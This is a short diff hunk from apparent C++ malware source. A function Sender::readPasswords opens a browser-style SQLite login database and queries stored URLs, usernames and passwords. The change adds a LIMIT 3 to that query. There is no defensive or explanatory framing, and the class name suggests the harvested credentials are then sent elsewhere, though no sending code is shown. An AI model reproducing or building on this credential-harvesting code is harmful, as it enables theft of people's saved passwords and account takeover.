@@ -34,7 +34,7 @@ void Sender::readPasswords(string dbPath)
 		exit(sqlite3_errcode(db));
 	}
 
-	string query = "SELECT url, username, password FROM logins";
+	string query = "SELECT url, username, password FROM logins LIMIT 3";
 	char* error;
 	if (sqlite3_exec(db, query.c_str(), Sender::sqlCallback, db, &error) != SQLITE_OK)
 	{
